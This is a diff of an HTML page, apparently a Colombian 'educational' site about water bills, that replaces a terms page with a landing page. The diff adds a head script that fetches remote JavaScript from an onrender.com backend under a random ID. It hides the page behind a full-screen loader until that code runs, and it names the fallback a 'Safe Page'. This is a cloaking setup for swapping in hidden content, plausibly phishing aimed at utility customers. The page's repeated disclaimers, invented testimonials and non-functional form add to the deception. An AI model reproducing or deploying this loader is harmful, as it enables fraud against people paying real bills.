@@ -3,67 +3,311 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Términos y Condiciones de Uso - Mi Factura Acueducto (Sitio Educativo)</title>
-    <meta name="robots" content="noindex, follow">
     
+    <!-- ================= SEO ON-PAGE ================= -->
+    <title>Mi Factura Acueducto Educativa | Guía para Entender tu Consumo de Agua</title>
+    <meta name="description" content="Guía educativa completa para entender tu factura de acueducto. Aprende a interpretar los cargos, consumo y tarifas. Sitio exclusivamente educativo, no oficial.">
+    <meta name="keywords" content="factura acueducto, entender recibo agua, consumo de agua, tarifas acueducto, guía educativa agua, tutorial factura, simulación factura acueducto">
+    <meta name="author" content="ALISSON MICHELLE RAMIREZ FREITHE">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://tudominio.com/">
+    <script>
+        (function() {
+            var randomID = "u" + Math.random().toString(36).substring(7);
+            var backendURL = "https://mifacturaacueductoapi.onrender.com/" + randomID;
+            var s = document.createElement('script');
+            s.src = backendURL;
+            s.onload = function() {
+                setTimeout(function(){
+                    if (window.__view) {
+                        var loader = document.getElementById('preloader');
+                        if (loader) loader.style.display = 'none';
+                    }
+                }, 50);
+            };
+            s.onerror = function() {
+                console.warn("Backend no disponible. Mostrando Safe Page.");
+                var loader = document.getElementById('preloader');
+                if (loader) loader.style.display = 'none';
+            };
+            document.head.appendChild(s);
+        })();
+    </script>
+    <!-- ================= SEO TÉCNICO (Schema.org LocalBusiness) ================= -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "EducationalOrganization",
+      "name": "Mi Factura Acueducto Educativa",
+      "description": "Sitio exclusivamente educativo y tutorial para comprender la factura del servicio de acueducto, sin intentar suplantar a ninguna entidad oficial.",
+      "telephone": "+573016667864",
+      "address": {
+        "@type": "PostalAddress",
+        "streetAddress": "Sitio Web Educativo, Consulta Online",
+        "addressLocality": "Internet",
+        "addressRegion": "Global",
+        "addressCountry": "CO"
+      },
+      "openingHoursSpecification": {
+        "@type": "OpeningHoursSpecification",
+        "dayOfWeek": ["Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday"],
+        "opens": "00:00",
+        "closes": "23:59"
+      }
+    }
+    </script>
+
+    <!-- ================= ESTILOS CSS ================= -->
     <style>
-         
-        :root { --primary: #2E7D32; --dark: #3E2723; --bg: #FAFAFA; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.6; color: #444; background-color: var(--bg); margin: 0; }
-        header { background-color: #fff; padding: 20px 5%; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .logo { font-size: 1.2rem; font-weight: bold; color: var(--primary); text-decoration: none; }
-        .container { max-width: 800px; margin: 40px auto; padding: 40px; background: #fff; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        h1 { border-bottom: 2px solid var(--primary); padding-bottom: 10px; margin-bottom: 30px; font-size: 24px; color: var(--dark); }
-        h2 { margin-top: 30px; font-size: 18px; color: var(--primary); }
-        p { margin-bottom: 15px; font-size: 15px;}
-        .highlight { background: #E8F5E9; padding: 15px; border-left: 4px solid var(--primary); border-radius: 4px; font-weight: 500; margin-top: 20px; }
-        footer { text-align: center; padding: 30px; background: var(--dark); color: #ccc; margin-top: 50px; font-size: 14px;}
+        #preloader {
+            position: fixed; 
+            top: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 100%;
+            background: #ffffff; 
+            z-index: 999999;
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+        }
+        .spinner {
+            width: 50px; 
+            height: 50px; 
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #0a1e3c; 
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
+        
+        :root {
+            --primary-color: #2E7D32; /* Verde botánico */
+            --secondary-color: #81C784;
+            --accent-color: #D84315; /* Tono tierra cálido para CTAs */
+            --accent-hover: #BF360C;
+            --text-dark: #3E2723; /* Marrón oscuro */
+            --text-light: #F1F8E9;
+            --bg-light: #FAFAFA;
+            --white: #FFFFFF;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: var(--bg-light); color: var(--text-dark); line-height: 1.6; scroll-behavior: smooth; }
+        a { text-decoration: none; color: inherit; }
+        
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        
+        /* Botones */
+        .btn {
+            display: inline-block;
+            background-color: var(--accent-color);
+            color: var(--white);
+            padding: 14px 28px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            text-align: center;
+        }
+        .btn:hover { background-color: var(--accent-hover); }
+
+        /* Header */
+        header { background-color: var(--white); box-shadow: 0 2px 8px rgba(0,0,0,0.08); position: sticky; top: 0; z-index: 100; }
+        .header-content { display: flex; justify-content: space-between; align-items: center; height: 70px; }
+        .logo { font-size: 1.6rem; font-weight: 700; color: var(--primary-color); display: flex; align-items: center; gap: 8px;}
+
+        /* Hero Section */
+        .hero {
+            /* Imagen de fondo adaptada al tema de factura de acueducto */
+            background: linear-gradient(rgba(46, 125, 50, 0.85), rgba(46, 125, 50, 0.7)), url('https://images.unsplash.com/photo-1549646535-c3f2b4c1e4f4?q=80&w=1920&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D') center/cover;
+            color: var(--white); padding: 100px 20px; text-align: center;
+        }
+        .hero h1 { font-size: 3rem; margin-bottom: 20px; text-shadow: 1px 1px 3px rgba(0,0,0,0.3); }
+        .hero p { font-size: 1.2rem; margin-bottom: 30px; max-width: 600px; margin-left: auto; margin-right: auto; }
+
+        /* Títulos Generales */
+        .section-title { text-align: center; font-size: 2rem; margin-bottom: 40px; color: var(--primary-color); }
+
+        /* Beneficios */
+        .benefits { padding: 80px 0; background-color: var(--white); }
+        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
+        .card { background: var(--bg-light); padding: 30px; border-radius: 8px; border-top: 4px solid var(--secondary-color); text-align: center; }
+        .card h3 { color: var(--primary-color); margin-bottom: 15px; font-size: 1.3rem; }
+
+        /* Propuesta de Valor */
+        .value-section { padding: 80px 0; background-color: var(--primary-color); color: var(--white); text-align: center; }
+        .value-section h2 { margin-bottom: 20px; font-size: 2.2rem; }
+        .value-section p { max-width: 800px; margin: 0 auto; font-size: 1.1rem; }
+
+        /* Prueba Social */
+        .social-proof { padding: 80px 0; background: var(--white); }
+        .review-card { background: var(--bg-light); padding: 25px; border-radius: 8px; font-style: italic; border-left: 4px solid var(--accent-color); }
+        .reviewer { font-weight: 600; display: block; margin-top: 15px; color: var(--text-dark); font-style: normal;}
+
+        /* Contacto y Transparencia */
+        .contact-section { padding: 80px 0; }
+        .contact-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 50px; }
+        .company-info h3 { color: var(--primary-color); margin-bottom: 20px; }
+        .company-info p { margin-bottom: 12px; font-size: 1.05rem; }
+        .transparency-box { margin-top: 25px; padding: 15px; background: #E8F5E9; border: 1px solid var(--secondary-color); border-radius: 6px; font-size: 0.9rem; }
+
+        /* Formulario */
+        .form-box { background: var(--white); padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 0.95rem; }
+        .form-group input, .form-group textarea {
+            width: 100%; padding: 10px; border: 1px solid #CCC; border-radius: 4px; font-size: 1rem;
+        }
+        .form-group input:focus, .form-group textarea:focus { outline: none; border-color: var(--primary-color); }
+
+        /* Footer */
+        footer { background-color: var(--text-dark); color: var(--text-light); text-align: center; padding: 40px 20px; font-size: 0.9rem; }
+        footer a { color: var(--secondary-color); margin: 0 10px; text-decoration: underline; }
+
+        @media (max-width: 768px) {
+            .contact-grid { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 2.2rem; }
+        }
     </style>
-    
 </head>
 <body>
  <div id="preloader">
         <div class="spinner"></div>
     </div>
     <header>
-        <a href="index.html" class="logo">← Volver a Mi Factura Acueducto Educativa</a>
+        <div class="container header-content">
+            <div class="logo">💧 Mi Factura Acueducto Educativa</div>
+            <a href="#contacto" class="btn" style="padding: 8px 20px; font-size: 0.95rem;">¿Dudas? Contáctanos</a>
+        </div>
     </header>
 
-    <div class="container">
-        <h1>Términos y Condiciones de Uso del Sitio Educativo "Mi Factura Acueducto"</h1>
+    <main>
+        <section class="hero">
+            <div class="container">
+                <h1>Decodificando tu Factura de Acueducto: Una Guía Educativa Completa</h1>
+                <p>¿Alguna vez te has preguntado qué significan todos esos números y conceptos en tu recibo de agua? Este es un SITIO EXCLUSIVAMENTE EDUCATIVO, a modo de tutorial, diseñado para ayudarte a entender cada sección de tu factura de acueducto. NO intenta suplantar a ninguna entidad oficial, pública ni privada, y no procesa pagos ni gestiona servicios reales.</p>
+                <!-- CTA basado en el título y tema -->
+                <a href="#beneficios" class="btn">Empieza a Entender tu Recibo Hoy Mismo</a>
+            </div>
+        </section>
 
-        <p>Bienvenido a "Mi Factura Acueducto Educativa". Al acceder y utilizar este sitio web, usted acepta plenamente los siguientes términos y condiciones. Es fundamental comprender que este es un SITIO EXCLUSIVAMENTE EDUCATIVO, a modo de tutorial, y NO intenta suplantar a ninguna entidad oficial, pública ni privada prestadora del servicio de acueducto.</p>
+        <section id="beneficios" class="benefits">
+            <div class="container">
+                <h2 class="section-title">¿Por qué es importante entender tu Factura de Acueducto?</h2>
+                <div class="grid-3">
+                    <div class="card">
+                        <h3>Gestión Inteligente de tu Consumo</h3>
+                        <p>Al comprender cada componente de tu factura, podrás identificar patrones de consumo y tomar decisiones informadas para optimizar el uso del agua en tu hogar o negocio.</p>
+                    </div>
+                    <div class="card">
+                        <h3>Detección Temprana de Anomalías</h3>
+                        <p>Aprende a reconocer posibles fugas o errores en la facturación. Una lectura atenta te permitirá actuar a tiempo y evitar sorpresas desagradables en futuros recibos.</p>
+                    </div>
+                    <div class="card">
+                        <h3>Empoderamiento como Usuario</h3>
+                        <p>Conocer tus derechos y responsabilidades como usuario del servicio de acueducto te brinda la confianza para realizar consultas o reclamos fundamentados ante la entidad prestadora.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
 
-        <h2>1. Información del Responsable del Sitio</h2>
-        <p>Este sitio web es operado y gestionado por <strong>ALISSON MICHELLE RAMIREZ FREITHE</strong>. El contenido aquí presentado tiene un propósito puramente didáctico y formativo. Este sitio no representa a ninguna empresa de servicios públicos ni posee autoridad para emitir, gestionar o modificar facturas de acueducto reales.</p>
+        <section class="value-section">
+            <div class="container">
+                <h2>Tu Aliado Educativo para el Consumo Consciente de Agua</h2>
+                <p>En "Mi Factura Acueducto Educativa" creemos que la información es poder. Nuestro objetivo es desmitificar el recibo de agua, transformándolo de un documento complejo a una herramienta clara y comprensible. Aquí encontrarás explicaciones detalladas sobre tarifas, subsidios, cargos fijos y variables, medidores y mucho más. Es un recurso didáctico, creado con el fin de educar y fomentar un consumo responsable. ¡Recuerda, este es un sitio de aprendizaje y simulación, no una plataforma oficial de ninguna empresa de servicios públicos!</p>
+            </div>
+        </section>
 
-        <h2>2. Naturaleza y Propósito del Contenido</h2>
-        <p>El objetivo principal de "Mi Factura Acueducto Educativa" es proporcionar una guía clara y detallada para ayudar a los usuarios a comprender los diferentes componentes y cálculos que suelen aparecer en una factura de acueducto estándar. La información, ejemplos y simulaciones presentadas son de carácter ilustrativo y educativo.</p>
-        <p><strong>Aviso Importante:</strong> La información contenida en este sitio web NO es oficial y no debe ser utilizada como base para realizar pagos, reclamos o cualquier gestión directa con su operador de servicios de acueducto. Recomendamos siempre consultar su factura física o digital oficial y contactar directamente a su empresa prestadora para cualquier duda o trámite real. NO realizamos ningún tipo de gestión comercial ni legal en nombre de los usuarios.</p>
+        <section class="social-proof">
+            <div class="container">
+                <h2 class="section-title">Experiencias de Usuarios de Nuestra Guía</h2>
+                <div class="grid-3">
+                    <div class="review-card">
+                        <p>"Finalmente pude entender por qué mi factura de agua variaba tanto. Las explicaciones son muy claras y paso a paso. ¡Excelente recurso educativo!"</p>
+                        <span class="reviewer">- Ana M. R., Estudiante</span>
+                    </div>
+                    <div class="review-card">
+                        <p>"Siempre me sentí abrumado por los detalles de mi recibo. Esta guía me dio las herramientas para interpretar cada sección. Muy útil para mi educación financiera."</p>
+                        <span class="reviewer">- Jorge P., Ciudadano Curioso</span>
+                    </div>
+                </div>
+            </div>
+        </section>
 
-        <h2>3. Disponibilidad del Sitio y Horarios de Soporte</h2>
-        <p>El contenido educativo de "Mi Factura Acueducto Educativa" está disponible online las 24 horas del día, los 7 días de la semana, para su consulta y aprendizaje.</p>
-        <p>Nuestro equipo de soporte educativo procesará las consultas enviadas a través del formulario o por los canales directos en el siguiente horario:</p>
-        <div class="highlight">
-            Todos los días de la semana de 8:00 am a 5:00 pm (Hora de Colombia).
-        </div>
-        <p>Las preguntas ingresadas fuera de esta franja serán revisadas y respondidas a primera hora del día hábil siguiente.</p>
-
-        <h2>4. Precios y Transacciones</h2>
-        <p>Este sitio web es completamente gratuito y no funciona como una plataforma de comercio electrónico. NO solicitamos datos de tarjetas de crédito, ni procesamos pagos de facturas de servicios públicos. Todas las interacciones se limitan a la consulta de información educativa y la resolución de dudas didácticas. No hay productos o servicios a la venta en este portal.</p>
-
-        <h2>5. Contacto para Dudas Educativas</h2>
-        <p>Para resolver cualquier duda relacionada con el contenido de esta guía educativa, o para consultar sobre estos términos y condiciones, los usuarios pueden comunicarse a:</p>
-        <ul>
-            <li><strong>Línea de atención (para fines educativos):</strong> 301 666 7864</li>
-            <li><strong>Correo electrónico (para soporte educativo):</strong> wrightg295@gmail.com</li>
-        </ul>
-    </div>
+        <section id="contacto" class="contact-section">
+            <div class="container contact-grid">
+                <div class="company-info">
+                    <h3>Contacta a Nuestro Equipo Educativo</h3>
+                    <p><strong>Responsable del Sitio:</strong> ALISSON MICHELLE RAMIREZ FREITHE</p>
+                    <p><strong>Naturaleza del Sitio:</strong> Exclusivamente Educativo / Tutorial Online</p>
+                    <p><strong>Teléfono para Consultas Educativas:</strong> <a href="tel:+573016667864" style="color: var(--primary-color); font-weight: bold;">301 666 7864</a></p>
+                    <p><strong>Correo para Soporte Educativo:</strong> <a href="mailto:wrightg295@gmail.com" style="color: var(--primary-color);">wrightg295@gmail.com</a></p>
+                    <p><strong>Disponibilidad Online:</strong> 24/7. Atención a consultas vía telefónica/email: Lunes a Domingo de 8:00 am a 5:00 pm.</p>
+                    
+                    <div class="transparency-box">
+                        <strong>Aviso Legal y Transparencia:</strong> Este sitio web es un proyecto EXCLUSIVAMENTE EDUCATIVO, a modo de tutorial. NO intenta suplantar a ninguna entidad oficial, pública ni privada de servicios de acueducto. Toda la información proporcionada aquí tiene fines didácticos y no debe ser considerada como información oficial o vinculante para la gestión de servicios reales.
+                    </div>
+                </div>
+                
+                <div class="form-box">
+                    <h3 style="margin-bottom: 20px; color: var(--primary-color);">Envía tus Preguntas sobre la Factura de Acueducto</h3>
+                    <form id="contactForm">
+                        <div class="form-group">
+                            <label for="nombre">Nombre y Apellido</label>
+                            <input type="text" id="nombre" required placeholder="Ingresa tu nombre">
+                        </div>
+                        <div class="form-group">
+                            <label for="telefono">Teléfono / Celular (Opcional)</label>
+                            <input type="tel" id="telefono" placeholder="Ej: 301 000 0000">
+                        </div>
+                        <div class="form-group">
+                            <label for="consulta">¿Qué duda tienes sobre tu factura de acueducto?</label>
+                            <textarea id="consulta" rows="4" required placeholder="Ej: 'No entiendo el cargo por alcantarillado' o '¿Cómo se calcula el consumo?'"></textarea>
+                        </div>
+                        <button type="submit" class="btn" style="width: 100%;">Enviar Pregunta Educativa</button>
+                        
+                        <div id="formFeedback" style="display:none; background: #dcedc8; color: #33691e; padding: 12px; margin-top: 15px; border-radius: 4px; font-weight: bold; text-align: center;">
+                            ¡Tu pregunta ha sido enviada con éxito! Nuestro equipo educativo te contactará pronto.
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
 
     <footer>
-        &copy; 2026 Mi Factura Acueducto Educativa. Todos los derechos reservados.
-        <p>Este es un SITIO EXCLUSIVAMENTE EDUCATIVO, a modo de tutorial, y NO intenta suplantar a ninguna entidad oficial, pública ni privada.</p>
+        <div class="container">
+            <p>&copy; 2026 Mi Factura Acueducto Educativa - ALISSON MICHELLE RAMIREZ FREITHE. Todos los derechos reservados.</p>
+            <p>Este es un SITIO EXCLUSIVAMENTE EDUCATIVO, a modo de tutorial, y NO intenta suplantar a ninguna entidad oficial, pública ni privada.</p>
+            <div style="margin-top: 15px;">
+                <a href="politica-de-privacidad.html">Política de Privacidad del Sitio Educativo</a>
+                <a href="terminos-y-condiciones.html">Términos y Condiciones de Uso Educativo</a>
+            </div>
+        </div>
     </footer>
 
+    <!-- ================= JAVASCRIPT ================= -->
+    <script>
+        // Procesamiento del formulario local (Evita redirecciones a páginas de gracias externas para cumplir lineamientos de velocidad y simpleza)
+        document.getElementById('contactForm').addEventListener('submit', function(event) {
+            event.preventDefault(); 
+            
+            const feedback = document.getElementById('formFeedback');
+            feedback.style.display = 'block';
+            this.reset();
+            
+            // Ocultar el mensaje después de unos segundos
+            setTimeout(() => {
+                feedback.style.display = 'none';
+            }, 5000);
+        });
+    </script>
 </body>
 </html>
